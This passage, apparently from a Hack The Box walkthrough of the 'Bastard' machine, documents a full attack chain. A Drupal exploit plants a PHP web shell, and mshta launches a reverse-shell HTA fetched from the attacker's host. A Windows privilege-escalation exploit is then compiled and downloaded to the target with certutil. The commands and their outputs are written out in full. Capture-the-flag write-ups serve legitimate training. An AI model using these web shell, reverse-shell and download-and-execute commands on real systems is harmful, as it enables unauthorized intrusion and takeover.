<span class="err">#</span><span class="w"> </span><span class="nl">Website</span><span class="p">:</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">ambionics</span><span class="p">.</span><span class="n">io</span><span class="o">/</span><span class="n">blog</span><span class="o">/</span><span class="n">drupal</span><span class="o">-</span><span class="n">services</span><span class="o">-</span><span class="k">module</span><span class="o">-</span><span class="n">rce</span><span class="w"></span>


<span class="err">#!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">php</span><span class="w"></span>
<span class="n">Stored</span><span class="w"> </span><span class="k">session</span><span class="w"> </span><span class="n">information</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="k">session</span><span class="p">.</span><span class="n">json</span><span class="w"></span>
<span class="n">Stored</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="n">information</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="k">user</span><span class="p">.</span><span class="n">json</span><span class="w"></span>
<span class="n">Cache</span><span class="w"> </span><span class="k">contains</span><span class="w"> </span><span class="mi">7</span><span class="w"> </span><span class="n">entries</span><span class="w"></span>
<span class="k">File</span><span class="w"> </span><span class="nl">written</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.10.9</span><span class="o">/</span><span class="mf">41564.</span><span class="n">php</span><span class="w"></span>
</pre></div>


<p>So if the script did its job I should have remote execution through the piece of code we added to the script, that is <code>&lt;?php system($_REQUEST["cmd"]); ?&gt;</code>.</p>
<p>Indeed, I am able to run commands in the victim box, such as <code>whoami</code>:</p>
<div class="highlight"><pre><span></span><span class="err">┌─[✗]─[doluar@parrot]─[~/Documents/htb/boxes/bastard]</span>
<span class="err">└──╼ $curl http://10.10.10.9/41564.php?cmd=whoami</span>
<span class="err">nt authority\iusr</span>
</pre></div>


<p>or <code>systeminfo</code></p>
<div class="highlight"><pre><span></span><span class="err">┌─</span><span class="o">[</span><span class="n">doluar@parrot</span><span class="o">]</span><span class="err">─</span><span class="o">[</span><span class="n">~/Documents/htb/boxes/bastard</span><span class="o">]</span><span class="w"></span>
<span class="err">└──╼</span><span class="w"> </span><span class="err">$</span><span class="n">curl</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.10.9</span><span class="o">/</span><span class="mf">41564.</span><span class="n">php</span><span class="vm">?</span><span class="n">cmd</span><span class="o">=</span><span class="n">systeminfo</span><span class="w"></span>

<span class="k">Host</span><span class="w"> </span><span class="nl">Name</span><span class="p">:</span><span class="w">                 </span><span class="n">BASTARD</span><span class="w"></span>
<span class="n">OS</span><span class="w"> </span><span class="nl">Name</span><span class="p">:</span><span class="w">                   </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">Server</span><span class="w"> </span><span class="mi">2008</span><span class="w"> </span><span class="n">R2</span><span class="w"> </span><span class="n">Datacenter</span><span class="w"> </span>
<span class="n">OS</span><span class="w"> </span><span class="nl">Version</span><span class="p">:</span><span class="w">                </span><span class="mf">6.1.7600</span><span class="w"> </span><span class="n">N</span><span class="o">/</span><span class="n">A</span><span class="w"> </span><span class="n">Build</span><span class="w"> </span><span class="mi">7600</span><span class="w"></span>
<span class="n">OS</span><span class="w"> </span><span class="nl">Manufacturer</span><span class="p">:</span><span class="w">           </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Corporation</span><span class="w"></span>
<span class="n">OS</span><span class="w"> </span><span class="nl">Configuration</span><span class="p">:</span><span class="w">          </span><span class="n">Standalone</span><span class="w"> </span><span class="n">Server</span><span class="w"></span>
<span class="n">OS</span><span class="w"> </span><span class="n">Build</span><span class="w"> </span><span class="nl">Type</span><span class="p">:</span><span class="w">             </span><span class="n">Multiprocessor</span><span class="w"> </span><span class="k">Free</span><span class="w"></span>
<span class="n">Registered</span><span class="w"> </span><span class="nl">Owner</span><span class="p">:</span><span class="w">          </span><span class="n">Windows</span><span class="w"> </span><span class="k">User</span><span class="w"></span>
<span class="n">Registered</span><span class="w"> </span><span class="nl">Organization</span><span class="p">:</span><span class="w">   </span>
<span class="n">Product</span><span class="w"> </span><span class="nl">ID</span><span class="p">:</span><span class="w">                </span><span class="mi">00496</span><span class="o">-</span><span class="mi">001</span><span class="o">-</span><span class="mi">0001283</span><span class="o">-</span><span class="mi">84782</span><span class="w"></span>
<span class="n">Original</span><span class="w"> </span><span class="n">Install</span><span class="w"> </span><span class="nc">Date</span><span class="err">:</span><span class="w">     </span><span class="mi">18</span><span class="o">/</span><span class="mi">3</span><span class="o">/</span><span class="mi">2017</span><span class="p">,</span><span class="w"> </span><span class="mi">7</span><span class="err">:</span><span class="mi">04</span><span class="err">:</span><span class="mi">46</span><span class="w"> </span>
<span class="k">System</span><span class="w"> </span><span class="n">Boot</span><span class="w"> </span><span class="nc">Time</span><span class="err">:</span><span class="w">          </span><span class="mi">7</span><span class="o">/</span><span class="mi">4</span><span class="o">/</span><span class="mi">2020</span><span class="p">,</span><span class="w"> </span><span class="mi">11</span><span class="err">:</span><span class="mi">30</span><span class="err">:</span><span class="mi">09</span><span class="w"> </span>
<span class="k">System</span><span class="w"> </span><span class="nl">Manufacturer</span><span class="p">:</span><span class="w">       </span><span class="n">VMware</span><span class="p">,</span><span class="w"> </span><span class="n">Inc</span><span class="p">.</span><span class="w"></span>
<span class="k">System</span><span class="w"> </span><span class="nl">Model</span><span class="p">:</span><span class="w">              </span><span class="n">VMware</span><span class="w"> </span><span class="n">Virtual</span><span class="w"> </span><span class="n">Platform</span><span class="w"></span>
<span class="k">System</span><span class="w"> </span><span class="nl">Type</span><span class="p">:</span><span class="w">               </span><span class="n">x64</span><span class="o">-</span><span class="n">based</span><span class="w"> </span><span class="n">PC</span><span class="w"></span>
<span class="n">Processor</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="err">:</span><span class="w">              </span><span class="mi">2</span><span class="w"> </span><span class="n">Processor</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="n">Installed</span><span class="p">.</span><span class="w"></span>
<span class="w">                           </span><span class="o">[</span><span class="n">01</span><span class="o">]</span><span class="err">:</span><span class="w"> </span><span class="n">AMD64</span><span class="w"> </span><span class="n">Family</span><span class="w"> </span><span class="mi">23</span><span class="w"> </span><span class="n">Model</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">Stepping</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">AuthenticAMD</span><span class="w"> </span><span class="o">~</span><span class="mi">2000</span><span class="w"> </span><span class="n">Mhz</span><span class="w"></span>
<span class="w">                           </span><span class="o">[</span><span class="n">02</span><span class="o">]</span><span class="err">:</span><span class="w"> </span><span class="n">AMD64</span><span class="w"> </span><span class="n">Family</span><span class="w"> </span><span class="mi">23</span><span class="w"> </span><span class="n">Model</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">Stepping</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">AuthenticAMD</span><span class="w"> </span><span class="o">~</span><span class="mi">2000</span><span class="w"> </span><span class="n">Mhz</span><span class="w"></span>
<span class="n">BIOS</span><span class="w"> </span><span class="nl">Version</span><span class="p">:</span><span class="w">              </span><span class="n">Phoenix</span><span class="w"> </span><span class="n">Technologies</span><span class="w"> </span><span class="n">LTD</span><span class="w"> </span><span class="mf">6.00</span><span class="p">,</span><span class="w"> </span><span class="mi">12</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">2018</span><span class="w"></span>
<span class="n">Windows</span><span class="w"> </span><span class="nl">Directory</span><span class="p">:</span><span class="w">         </span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="w"></span>
<span class="k">System</span><span class="w"> </span><span class="nl">Directory</span><span class="p">:</span><span class="w">          </span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">system32</span><span class="w"></span>
<span class="n">Boot</span><span class="w"> </span><span class="nl">Device</span><span class="p">:</span><span class="w">               </span><span class="err">\</span><span class="n">Device</span><span class="err">\</span><span class="n">HarddiskVolume1</span><span class="w"></span>
<span class="k">System</span><span class="w"> </span><span class="nl">Locale</span><span class="p">:</span><span class="w">             </span><span class="n">el</span><span class="p">;</span><span class="n">Greek</span><span class="w"></span>
<span class="k">Input</span><span class="w"> </span><span class="nl">Locale</span><span class="p">:</span><span class="w">              </span><span class="n">en</span><span class="o">-</span><span class="n">us</span><span class="p">;</span><span class="n">English</span><span class="w"> </span><span class="p">(</span><span class="n">United</span><span class="w"> </span><span class="n">States</span><span class="p">)</span><span class="w"></span>
<span class="nc">Time</span><span class="w"> </span><span class="k">Zone</span><span class="err">:</span><span class="w">                 </span><span class="p">(</span><span class="n">UTC</span><span class="o">+</span><span class="mi">02</span><span class="err">:</span><span class="mi">00</span><span class="p">)</span><span class="w"> </span><span class="n">Athens</span><span class="p">,</span><span class="w"> </span><span class="n">Bucharest</span><span class="p">,</span><span class="w"> </span><span class="n">Istanbul</span><span class="w"></span>
<span class="n">Total</span><span class="w"> </span><span class="n">Physical</span><span class="w"> </span><span class="nl">Memory</span><span class="p">:</span><span class="w">     </span><span class="mf">2.047</span><span class="w"> </span><span class="n">MB</span><span class="w"></span>
<span class="n">Available</span><span class="w"> </span><span class="n">Physical</span><span class="w"> </span><span class="nl">Memory</span><span class="p">:</span><span class="w"> </span><span class="mf">1.525</span><span class="w"> </span><span class="n">MB</span><span class="w"></span>
<span class="n">Virtual</span><span class="w"> </span><span class="nl">Memory</span><span class="p">:</span><span class="w"> </span><span class="nf">Max</span><span class="w"> </span><span class="k">Size</span><span class="err">:</span><span class="w">  </span><span class="mf">4.095</span><span class="w"> </span><span class="n">MB</span><span class="w"></span>
<span class="n">Virtual</span><span class="w"> </span><span class="nl">Memory</span><span class="p">:</span><span class="w"> </span><span class="nl">Available</span><span class="p">:</span><span class="w"> </span><span class="mf">3.551</span><span class="w"> </span><span class="n">MB</span><span class="w"></span>
<span class="n">Virtual</span><span class="w"> </span><span class="nl">Memory</span><span class="p">:</span><span class="w"> </span><span class="ow">In</span><span class="w"> </span><span class="k">Use</span><span class="err">:</span><span class="w">    </span><span class="mi">544</span><span class="w"> </span><span class="n">MB</span><span class="w"></span>
<span class="n">Page</span><span class="w"> </span><span class="k">File</span><span class="w"> </span><span class="n">Location</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="err">:</span><span class="w">     </span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">pagefile</span><span class="p">.</span><span class="n">sys</span><span class="w"></span>
<span class="k">Domain</span><span class="err">:</span><span class="w">                    </span><span class="n">HTB</span><span class="w"></span>
<span class="n">Logon</span><span class="w"> </span><span class="nl">Server</span><span class="p">:</span><span class="w">              </span><span class="n">N</span><span class="o">/</span><span class="n">A</span><span class="w"></span>
<span class="n">Hotfix</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="err">:</span><span class="w">                 </span><span class="n">N</span><span class="o">/</span><span class="n">A</span><span class="w"></span>
<span class="n">Network</span><span class="w"> </span><span class="n">Card</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="err">:</span><span class="w">           </span><span class="mi">1</span><span class="w"> </span><span class="n">NIC</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="n">Installed</span><span class="p">.</span><span class="w"></span>
<span class="w">                           </span><span class="o">[</span><span class="n">01</span><span class="o">]</span><span class="err">:</span><span class="w"> </span><span class="n">Intel</span><span class="p">(</span><span class="n">R</span><span class="p">)</span><span class="w"> </span><span class="n">PRO</span><span class="o">/</span><span class="mi">1000</span><span class="w"> </span><span class="n">MT</span><span class="w"> </span><span class="n">Network</span><span class="w"> </span><span class="k">Connection</span><span class="w"></span>
<span class="w">                                 </span><span class="k">Connection</span><span class="w"> </span><span class="nl">Name</span><span class="p">:</span><span class="w"> </span><span class="k">Local</span><span class="w"> </span><span class="n">Area</span><span class="w"> </span><span class="k">Connection</span><span class="w"></span>
<span class="w">                                 </span><span class="n">DHCP</span><span class="w"> </span><span class="nl">Enabled</span><span class="p">:</span><span class="w">    </span><span class="k">No</span><span class="w"></span>
<span class="w">                                 </span><span class="n">IP</span><span class="w"> </span><span class="n">address</span><span class="p">(</span><span class="n">es</span><span class="p">)</span><span class="w"></span>
<span class="w">                                 </span><span class="o">[</span><span class="n">01</span><span class="o">]</span><span class="err">:</span><span class="w"> </span><span class="mf">10.10.10.9</span><span class="w"></span>
</pre></div>


<p>At this point, I want to get a full shell on my box so I use a Living Off The Land tactic, that is <a href="https://lolbas-project.github.io/lolbas/Binaries/Mshta/"><code>mshta</code></a>. To do this I download a python script called <a href="https://github.com/felamos/weirdhta">weirdhta</a>.</p>
<div class="highlight"><pre><span></span><span class="err">┌─</span><span class="o">[</span><span class="n">doluar@parrot</span><span class="o">]</span><span class="err">─</span><span class="o">[</span><span class="n">~/Tools/weirdhta</span><span class="o">]</span><span class="w"></span>
<span class="err">└──╼</span><span class="w"> </span><span class="err">$</span><span class="p">.</span><span class="o">/</span><span class="n">weirdhta</span><span class="p">.</span><span class="n">py</span><span class="w"> </span>

<span class="w"> </span><span class="err">█</span><span class="w">     </span><span class="err">█░▓█████</span><span class="w">  </span><span class="err">██▓</span><span class="w"> </span><span class="err">██▀███</span><span class="w">  </span><span class="err">▓█████▄</span><span class="w">     </span><span class="err">██░</span><span class="w"> </span><span class="err">██</span><span class="w"> </span><span class="err">▄▄▄█████▓</span><span class="w"> </span><span class="err">▄▄▄</span><span class="w"></span>
<span class="err">▓█░</span><span class="w"> </span><span class="err">█</span><span class="w"> </span><span class="err">░█░▓█</span><span class="w">   </span><span class="err">▀</span><span class="w"> </span><span class="err">▓██▒▓██</span><span class="w"> </span><span class="err">▒</span><span class="w"> </span><span class="err">██▒▒██▀</span><span class="w"> </span><span class="err">██▌</span><span class="w">   </span><span class="err">▓██░</span><span class="w"> </span><span class="err">██▒▓</span><span class="w">  </span><span class="err">██▒</span><span class="w"> </span><span class="err">▓▒▒████▄</span><span class="w"></span>
<span class="err">▒█░</span><span class="w"> </span><span class="err">█</span><span class="w"> </span><span class="err">░█</span><span class="w"> </span><span class="err">▒███</span><span class="w">   </span><span class="err">▒██▒▓██</span><span class="w"> </span><span class="err">░▄█</span><span class="w"> </span><span class="err">▒░██</span><span class="w">   </span><span class="err">█▌</span><span class="w">   </span><span class="err">▒██▀▀██░▒</span><span class="w"> </span><span class="err">▓██░</span><span class="w"> </span><span class="err">▒░▒██</span><span class="w">  </span><span class="err">▀█▄</span><span class="w"></span>
<span class="err">░█░</span><span class="w"> </span><span class="err">█</span><span class="w"> </span><span class="err">░█</span><span class="w"> </span><span class="err">▒▓█</span><span class="w">  </span><span class="err">▄</span><span class="w"> </span><span class="err">░██░▒██▀▀█▄</span><span class="w">  </span><span class="err">░▓█▄</span><span class="w">   </span><span class="err">▌</span><span class="w">   </span><span class="err">░▓█</span><span class="w"> </span><span class="err">░██</span><span class="w"> </span><span class="err">░</span><span class="w"> </span><span class="err">▓██▓</span><span class="w"> </span><span class="err">░</span><span class="w"> </span><span class="err">░██▄▄▄▄██</span><span class="w"></span>
<span class="err">░░██▒██▓</span><span class="w"> </span><span class="err">░▒████▒░██░░██▓</span><span class="w"> </span><span class="err">▒██▒░▒████▓</span><span class="w">    </span><span class="err">░▓█▒░██▓</span><span class="w">  </span><span class="err">▒██▒</span><span class="w"> </span><span class="err">░</span><span class="w">  </span><span class="err">▓█</span><span class="w">   </span><span class="err">▓██▒</span><span class="w"></span>
<span class="err">░</span><span class="w"> </span><span class="err">▓░▒</span><span class="w"> </span><span class="err">▒</span><span class="w">  </span><span class="err">░░</span><span class="w"> </span><span class="err">▒░</span><span class="w"> </span><span class="err">░░▓</span><span class="w">  </span><span class="err">░</span><span class="w"> </span><span class="err">▒▓</span><span class="w"> </span><span class="err">░▒▓░</span><span class="w"> </span><span class="err">▒▒▓</span><span class="w">  </span><span class="err">▒</span><span class="w">     </span><span class="err">▒</span><span class="w"> </span><span class="err">░░▒░▒</span><span class="w">  </span><span class="err">▒</span><span class="w"> </span><span class="err">░░</span><span class="w">    </span><span class="err">▒▒</span><span class="w">   </span><span class="err">▓▒█░</span><span class="w"></span>
<span class="w">  </span><span class="err">▒</span><span class="w"> </span><span class="err">░</span><span class="w"> </span><span class="err">░</span><span class="w">   </span><span class="err">░</span><span class="w"> </span><span class="err">░</span><span class="w">  </span><span class="err">░</span><span class="w"> </span><span class="err">▒</span><span class="w"> </span><span class="err">░</span><span class="w">  </span><span class="err">░▒</span><span class="w"> </span><span class="err">░</span><span class="w"> </span><span class="err">▒░</span><span class="w"> </span><span class="err">░</span><span class="w"> </span><span class="err">▒</span><span class="w">  </span><span class="err">▒</span><span class="w">     </span><span class="err">▒</span><span class="w"> </span><span class="err">░▒░</span><span class="w"> </span><span class="err">░</span><span class="w">    </span><span class="err">░</span><span class="w">      </span><span class="err">▒</span><span class="w">   </span><span class="err">▒▒</span><span class="w"> </span><span class="err">░</span><span class="w"></span>
<span class="w">  </span><span class="err">░</span><span class="w">   </span><span class="err">░</span><span class="w">     </span><span class="err">░</span><span class="w">    </span><span class="err">▒</span><span class="w"> </span><span class="err">░</span><span class="w">  </span><span class="err">░░</span><span class="w">   </span><span class="err">░</span><span class="w">  </span><span class="err">░</span><span class="w"> </span><span class="err">░</span><span class="w">  </span><span class="err">░</span><span class="w">     </span><span class="err">░</span><span class="w">  </span><span class="err">░░</span><span class="w"> </span><span class="err">░</span><span class="w">  </span><span class="err">░</span><span class="w">        </span><span class="err">░</span><span class="w">   </span><span class="err">▒</span><span class="w"></span>
<span class="w">    </span><span class="err">░</span><span class="w">       </span><span class="err">░</span><span class="w">  </span><span class="err">░</span><span class="w"> </span><span class="err">░</span><span class="w">     </span><span class="err">░</span><span class="w">        </span><span class="err">░</span><span class="w">        </span><span class="err">░</span><span class="w">  </span><span class="err">░</span><span class="w">  </span><span class="err">░</span><span class="w">               </span><span class="err">░</span><span class="w">  </span><span class="err">░</span><span class="w"></span>
<span class="w">                              </span><span class="err">░</span><span class="w"></span>
<span class="w">                                                    </span><span class="k">by</span><span class="w"> </span><span class="n">felamos</span><span class="w"></span>


<span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="n">Powershell</span><span class="w"> </span><span class="nf">Reverse</span><span class="w"> </span><span class="n">Shell</span><span class="p">.</span><span class="w"></span>
<span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="n">Custom</span><span class="w"> </span><span class="n">Command</span><span class="p">.</span><span class="w"></span>

<span class="o">&gt;</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span>
<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">Enter</span><span class="w"> </span><span class="n">IP</span><span class="w"> </span><span class="nl">Address</span><span class="p">:</span><span class="w"> </span><span class="mf">10.10.14.61</span><span class="w"></span>
<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">Enter</span><span class="w"> </span><span class="nl">PORT</span><span class="p">:</span><span class="w"> </span><span class="mi">443</span><span class="w"></span>
<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">Written</span><span class="w"> </span><span class="n">test</span><span class="p">.</span><span class="n">hta</span><span class="w"></span>
</pre></div>


<p>Once I run the tool it asks for an IP and a port. I provide the IP of my attacking machine and port 443. This will create a payload, test.hta, which if executed on the victim machine would give us a shell back on my parrotos box.</p>
<p>So I start a simple python http server in the directory where the test.hta file is located:</p>
<div class="highlight"><pre><span></span><span class="err">┌─</span><span class="o">[</span><span class="n">doluar@parrot</span><span class="o">]</span><span class="err">─</span><span class="o">[</span><span class="n">~/Tools/weirdhta</span><span class="o">]</span><span class="w"></span>
<span class="err">└──╼</span><span class="w"> </span><span class="err">$</span><span class="n">sudo</span><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="o">-</span><span class="n">m</span><span class="w"> </span><span class="n">SimpleHTTPServer</span><span class="w"></span>
<span class="o">[</span><span class="n">sudo</span><span class="o">]</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nl">doluar</span><span class="p">:</span><span class="w"> </span>
<span class="n">Serving</span><span class="w"> </span><span class="n">HTTP</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="mf">0.0.0.0</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="mi">8000</span><span class="w"> </span><span class="p">...</span><span class="w"></span>
</pre></div>


<p>then I start a netcat listener on port 443 and I launch the following command:</p>
<div class="highlight"><pre><span></span><span class="err">┌─[✗]─[doluar@parrot]─[~/Tools/weirdhta]</span>
<span class="err">└──╼ $curl http://10.10.10.9/41564.php?cmd=&#39;C%3A%2FWindows%2FSystem32%2Fmshta.exe+http%3A%2F%2F10.10.14.61%3A8000%2Ftest.hta&#39; -v</span>
<span class="err">*   Trying 10.10.10.9:80...</span>
<span class="err">* TCP_NODELAY set</span>
<span class="err">* Connected to 10.10.10.9 (10.10.10.9) port 80 (#0)</span>
<span class="err">&gt; GET /41564.php?cmd=C%3A%2FWindows%2FSystem32%2Fmshta.exe+http%3A%2F%2F10.10.14.61%3A8000%2Ftest.hta HTTP/1.1</span>
<span class="err">&gt; Host: 10.10.10.9</span>
<span class="err">&gt; User-Agent: curl/7.68.0</span>
<span class="err">&gt; Accept: */*</span>
<span class="err">&gt; </span>
<span class="err">* Mark bundle as not supporting multiuse</span>
<span class="err">&lt; HTTP/1.1 200 OK</span>
<span class="err">&lt; Content-Type: text/html</span>
<span class="err">&lt; Server: Microsoft-IIS/7.5</span>
<span class="err">&lt; X-Powered-By: PHP/5.3.28</span>
<span class="err">&lt; X-Powered-By: ASP.NET</span>
<span class="err">&lt; Date: Thu, 09 Apr 2020 05:27:41 GMT</span>
<span class="err">&lt; Content-Length: 0</span>
<span class="err">&lt; </span>
<span class="err">* Connection #0 to host 10.10.10.9 left intact</span>
</pre></div>


<p>where the <code>C%3A%2FWindows%2FSystem32%2Fmshta.exe+http%3A%2F%2F10.10.14.61%3A8000%2Ftest.hta</code> is the URL encoded part for <code>C:\Windows\System32\mshta.exe http://10.10.14.61:8000/test.hta</code>.</p>
<p>The netcat listener I had started shows I got a shell successfully:</p>
<div class="highlight"><pre><span></span><span class="err">┌─</span><span class="o">[</span><span class="n">✗</span><span class="o">]</span><span class="err">─</span><span class="o">[</span><span class="n">doluar@parrot</span><span class="o">]</span><span class="err">─</span><span class="o">[</span><span class="n">~/Documents/htb/boxes/bastard</span><span class="o">]</span><span class="w"></span>
<span class="err">└──╼</span><span class="w"> </span><span class="err">$</span><span class="n">sudo</span><span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lvnp</span><span class="w"> </span><span class="mi">443</span><span class="w"></span>
<span class="o">[</span><span class="n">sudo</span><span class="o">]</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nl">doluar</span><span class="p">:</span><span class="w"> </span>
<span class="n">listening</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="o">[</span><span class="n">any</span><span class="o">]</span><span class="w"> </span><span class="mi">443</span><span class="w"> </span><span class="p">...</span><span class="w"></span>
<span class="k">connect</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="o">[</span><span class="n">10.10.14.61</span><span class="o">]</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">UNKNOWN</span><span class="p">)</span><span class="w"> </span><span class="o">[</span><span class="n">10.10.10.9</span><span class="o">]</span><span class="w"> </span><span class="mi">49484</span><span class="w"></span>
<span class="n">Client</span><span class="w"> </span><span class="n">Connected</span><span class="p">...</span><span class="w"></span>

<span class="n">PS</span><span class="w"> </span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">inetpub</span><span class="err">\</span><span class="n">drupal</span><span class="o">-</span><span class="mf">7.54</span><span class="o">&gt;</span><span class="w"> </span>
</pre></div>


<p>Looking around I see there is a user folder called <code>dimitris</code> and i found the user.txt in the Desktop:</p>
<div class="highlight"><pre><span></span><span class="err">PS C:\Users\dimitris\Desktop&gt; cat user.txt</span>
<span class="err">ba****************************a2</span>
</pre></div>


<p>Now we need to find be able to read the root.txt which requires us to be Administrator. </p>
<p>From the <code>systeminfo</code> command I had previously ran I see that the OS version is <code>6.1.7600 N/A Build 7600</code> which is exactly the same version of another box I had recently exploited, that is <a href="https://sittingducks.io/Devel.html">Devel</a>. Furthemore, the <code>systeminfo</code> suggests that the Windows machine does not have any hotfixes installed. For this Windows version we can use exploit 40564 from exploitdb. So I repeat the same procedure with the only difference that this time the target system is a x64 bit architecture. Because of this instead of running <code>i686-w64-mingw32-gcc</code> I run <code>x86_64-w64-mingw32-gcc</code> to compile the "C" program.</p>
<div class="highlight"><pre><span></span><span class="err">┌─[doluar@parrot]─[~/Documents/htb/boxes/bastard]</span>
<span class="err">└──╼ $x86_64-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32</span>
<span class="err">┌─[doluar@parrot]─[~/Documents/htb/boxes/bastard]</span>
<span class="err">└──╼ $ll</span>
<span class="err">total 376K</span>
<span class="err">-rw-r--r-- 1 doluar doluar  32K Apr  9 07:32 40564.c</span>
<span class="err">-rw-r--r-- 1 doluar doluar 8.5K Apr  8 19:43 41564.php</span>
<span class="err">-rwxr-xr-x 1 doluar doluar 323K Apr  9 08:06 MS11-046.exe</span>
<span class="err">-rw-r--r-- 1 doluar doluar  187 Apr  8 19:45 session.json</span>
<span class="err">-rw-r--r-- 1 doluar doluar  799 Apr  8 19:45 user.json</span>
</pre></div>


<p>Now that I have the exe file I can upload it to the victim machine using another Windows built-in tool, that is <a href="https://lolbas-project.github.io/lolbas/Binaries/Certutil/#download"><code>certutil.exe</code></a>. To do that I first start a python simple http server in the directory where I have the exe file.</p>
<div class="highlight"><pre><span></span><span class="err">┌─[doluar@parrot]─[~/Documents/htb/boxes/bastard]</span>
<span class="err">└──╼ $sudo python -m SimpleHTTPServer</span>
<span class="err">Serving HTTP on 0.0.0.0 port 8000 ...</span>
</pre></div>


<p>Then</p>
<div class="highlight"><pre><span></span><span class="n">PS</span><span class="w"> </span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">inetpub</span><span class="err">\</span><span class="n">drupal</span><span class="o">-</span><span class="mf">7.54</span><span class="o">&gt;</span><span class="w"> </span><span class="err">┌─</span><span class="o">[</span><span class="n">doluar@parrot</span><span class="o">]</span><span class="err">─</span><span class="o">[</span><span class="n">~/Documents/htb/boxes/bastard</span><span class="o">]</span><span class="w"></span>
<span class="err">└──╼</span><span class="w"> </span><span class="err">$</span><span class="n">sudo</span><span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lvnp</span><span class="w"> </span><span class="mi">443</span><span class="w"></span>
<span class="o">[</span><span class="n">sudo</span><span class="o">]</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nl">doluar</span><span class="p">:</span><span class="w"> </span>
<span class="n">listening</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="o">[</span><span class="n">any</span><span class="o">]</span><span class="w"> </span><span class="mi">443</span><span class="w"> </span><span class="p">...</span><span class="w"></span>
<span class="k">connect</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="o">[</span><span class="n">10.10.14.61</span><span class="o">]</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">UNKNOWN</span><span class="p">)</span><span class="w"> </span><span class="o">[</span><span class="n">10.10.10.9</span><span class="o">]</span><span class="w"> </span><span class="mi">49585</span><span class="w"></span>
<span class="n">Client</span><span class="w"> </span><span class="n">Connected</span><span class="p">...</span><span class="w"></span>

<span class="n">PS</span><span class="w"> </span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">inetpub</span><span class="err">\</span><span class="n">drupal</span><span class="o">-</span><span class="mf">7.54</span><span class="o">&gt;</span><span class="w"> </span><span class="nl">c</span><span class="p">:</span><span class="err">\</span><span class="n">windows</span><span class="err">\</span><span class="n">system32</span><span class="err">\</span><span class="n">certutil</span><span class="p">.</span><span class="n">exe</span><span class="w"> </span><span class="o">-</span><span class="n">urlcache</span><span class="w"> </span><span class="o">-</span><span class="n">split</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.14.61</span><span class="err">:</span><span class="mi">8000</span><span class="o">/</span><span class="n">ms15</span><span class="o">-</span><span class="mf">051.</span><span class="n">exe</span><span class="w"> </span><span class="n">ms15</span><span class="o">-</span><span class="mf">051.</span><span class="n">exe</span><span class="w"></span>
<span class="o">****</span><span class="w">  </span><span class="n">Online</span><span class="w">  </span><span class="o">****</span><span class="w"></span>
<span class="mi">0000</span><span class="w">  </span><span class="p">...</span><span class="w"></span>
<span class="n">d800</span><span class="w"></span>
<span class="nl">CertUtil</span><span class="p">:</span><span class="w"> </span><span class="o">-</span><span class="n">URLCache</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="n">completed</span><span class="w"> </span><span class="n">successfully</span><span class="p">.</span><span class="w"> </span><span class="n">dir</span><span class="w">                                                                                          </span>


<span class="w">    </span><span class="nl">Directory</span><span class="p">:</span><span class="w"> </span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">inetpub</span><span class="err">\</span><span class="n">drupal</span><span class="o">-</span><span class="mf">7.54</span><span class="w">                                                                                   </span>


